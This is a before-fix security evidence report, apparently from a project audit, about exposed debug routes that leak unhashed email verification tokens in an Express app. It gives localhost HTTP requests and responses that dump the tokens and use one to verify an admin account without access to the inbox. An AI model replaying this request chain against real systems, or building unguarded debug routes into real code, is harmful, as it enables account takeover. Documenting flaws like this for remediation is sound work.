# BEFORE-FIX EVIDENCE: V03 — Public Debug Token Exposure

**Vulnerability:** Public Exposure of Unhashed Email Verification Tokens via Debug Routes  
**OWASP Category:** A05:2021 – Security Misconfiguration  
**Affected Component:** `GET /api/debug/tokens` and `GET /api/debug/tokens/:email`  
**Preconditions:** A user registration exists with an unverified email address  

---

## Attack Description & Flow

1. In `backend/src/routes/debug.js`, developer debug endpoints are implemented to query MongoDB for user email verification tokens:
   * `GET /api/debug/tokens/:email` returns the email verification token and expiry timestamp for the specified email.
   * `GET /api/debug/tokens` queries all users in the database having an `emailVerificationToken` and dumps their email, token, and expiration timestamp.
2. In `backend/app.js:71`, the router is mounted in the application root without environment guards:
   ```javascript
   app.use('/api/debug', debugRoutes);
   ```
3. These endpoints have **no authentication or authorization middleware** (`protect` or `authorize` are omitted).
4. An unauthenticated attacker can query the endpoints, extract any victim's verification token, and immediately verify the account via `GET /api/users/verify-email/:token`, completely bypassing email ownership verification.

---

## Runtime Verification Logs

### 1. Unauthenticated Dump of All Active Verification Tokens

```http
GET /api/debug/tokens HTTP/1.1
Host: 127.0.0.1:5001

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{
  "success": true,
  "count": 1,
  "tokens": [
    {
      "email": "test_admin@test.com",
      "token": "bed781de317734d11cea266c945702f5397b13179c40d8c95d3084d8f9f99919",
      "expires": "2026-09-26T21:28:27.181Z"
    }
  ]
}
```

### 2. Unauthenticated Target-Specific Token Query

```http
GET /api/debug/tokens/test_admin@test.com HTTP/1.1
Host: 127.0.0.1:5001

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{
  "success": true,
  "email": "test_admin@test.com",
  "token": "bed781de317734d11cea266c945702f5397b13179c40d8c95d3084d8f9f99919",
  "expires": "2026-09-26T21:28:27.181Z"
}
```

### 3. Exploitation: Verifying Email Using Stolen Token

Submitting the stolen token directly to the public verification route:

```http
GET /api/users/verify-email/bed781de317734d11cea266c945702f5397b13179c40d8c95d3084d8f9f99919 HTTP/1.1
Host: 127.0.0.1:5001

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{
  "success": true,
  "message": "Email verified successfully! You can now log in.",
  "data": {
    "user": {
      "id": "6ab6e7795e89b106943f7a94",
      "email": "test_admin@test.com",
      "role": "admin",
      "isEmailVerified": true
    }
  }
}
```

---

## Observed Result vs Expected Secure Result

* **Observed Result:** Unauthenticated HTTP requests dumped cleartext tokens from the database, allowing immediate account activation without access to the user's email inbox.
* **Expected Secure Result:** Debug routes must never be exposed in production environments; verification tokens should be hashed (e.g., SHA-256) prior to storage, and any administrative diagnostics must enforce strict authentication and authorization.

**Impact:** Complete bypass of email verification security barrier; automated unauthorized account verification and activation.  
**Source Location:** `backend/src/routes/debug.js:7-67`, `backend/app.js:71`.  
**Runtime Verification:** **CONFIRMED RUNTIME**  
**Evidence Files:** `security/V03-debug-token-exposure/before/evidence.md`
